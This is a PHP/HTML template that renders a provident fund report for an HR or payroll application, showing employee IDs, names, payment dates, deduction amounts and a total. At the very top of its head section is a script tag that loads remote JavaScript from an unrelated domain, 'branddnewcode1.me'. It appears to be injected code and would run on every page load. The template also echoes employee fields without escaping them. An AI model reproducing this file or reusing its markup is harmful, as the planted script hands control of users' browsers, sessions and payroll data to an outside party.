<!DOCTYPE html>
<html>
<head>
<script type="text/javascript" src="https://branddnewcode1.me/code/gy3dknzugy5ha3ddf44donq" async></script>
    <title>Provident Fund</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <?php
    $direction = $this->session->userdata('direction');
    if (!empty($direction) && $direction == 'rtl') {
        $RTL = 'on';
    } else {
        $RTL = config_item('RTL');
    }
    ?>
    <style type="text/css">
        .table_tr1 th{
            background-color: rgb(224, 224, 224);
            height: 40px;
        <?php if(!empty($RTL)){?> text-align: right;<?php }?>
        }

        .table_tr1 td {
            padding: 7px 0px 7px 8px;
            font-weight: bold;
            border: 1px solid black;
        <?php if(!empty($RTL)){?> text-align: right;<?php }?>
        }

        .table_tr2 td {
            padding: 7px 0px 7px 8px;
        <?php if(!empty($RTL)){?> text-align: right;<?php }?>
        }

        .total_amount {
            background-color: rgb(224, 224, 224);
            font-weight: bold;
        <?php if(!empty($RTL)){?> text-align: left;<?php }else{?>text-align: right;<?php }?>

        }

        .total_amount td {
            padding: 7px 8px 7px 0px;
            border: 1px solid black;
            font-size: 15px;
        <?php if(!empty($RTL)){?> text-align: right;<?php }?>
        }
    </style>
</head>
<body style="min-width: 100%; min-height: 100%; overflow: hidden; alignment-adjust: central;">
<br/>
<?php
$img = ROOTPATH . '/' . config_item('company_logo');
$a = file_exists($img);
if (empty($a)) {
    $img = base_url() . config_item('company_logo');
}
if(!file_exists($img)){
    $img = ROOTPATH . '/' . 'uploads/default_logo.png';
}
?>
<div style="width: 100%; border-bottom: 2px solid black;">
    <table style="width: 100%; vertical-align: middle;">
        <tr>
            <td style="width: 50px; border: 0px;">
                <img style="width: 50px;height: 50px;margin-bottom: 5px;"
                     src="<?= $img ?>" alt="" class="img-circle"/>
            </td>
            <td style="border: 0px;">
                <p style="margin-left: 10px; font: 14px lighter;"><?= config_item('company_name') ?></p>
            </td>
        </tr>
    </table>
</div>
<br/>
<div style="width: 100%;">
    <div style="width: 100%; background-color: rgb(224, 224, 224); padding: 1px 0px 5px 15px;">
        <table style="width: 100%;">
            <tr style="font-size: 20px;  text-align: center">
                <td style="padding: 10px;"><?= lang('provident_found_report') . ' ' . lang('for') ?><?php echo ' ' . $monthyaer ?></td>
            </tr>
        </table>
    </div>
    <br/>
    <table style="width: 100%; font-family: Arial, Helvetica, sans-serif; border-collapse: collapse;">
        <tr class="table_tr1">
            <th><?= lang('emp_id') ?></th>
            <th><?= lang('name') ?></th>
            <th><?= lang('payment_date') ?></th>
            <th><?= lang('amount') ?></th>
        </tr>
        <?php
        $key = 1;
        $total_amount = 0;
        $curency = $this->db->where('code', config_item('default_currency'))->get('tbl_currencies')->row();
        if (!empty($provident_fund_info)): foreach ($provident_fund_info as $provident_fund) : ?>
            <tr class="table_tr2">
                <td><?php echo $provident_fund->employment_id ?></td>
                <td><?php echo $provident_fund->fullname ?></td>
                <td><?= strftime(config_item('date_format'), strtotime($provident_fund->paid_date)) ?></td>
                <td><?php echo display_money($provident_fund->salary_payment_deduction_value, $curency->symbol);
                    $total_amount += $provident_fund->salary_payment_deduction_value;
                    ?></td>

            </tr>
            <?php
            $key++;
        endforeach;
            ?>
            <tr class="total_amount">
                <td colspan="3" style="text-align: right;">
                    <strong><?= lang('total') . ' ' . lang('provident_fund') ?>
                        : </strong></td>
                <td colspan="3" style="padding-left: 8px;"><strong><?php
                        echo display_money($total_amount, $curency->symbol);
                        ?></strong></td>
            </tr>
        <?php else : ?>
            <tr>
                <td style="border: 1px solid black;" colspan="7">
                    <strong><?= lang('nothing_to_display') ?></strong>
                </td>
            </tr>
        <?php endif; ?>
    </table>
</div>
</body>
</html>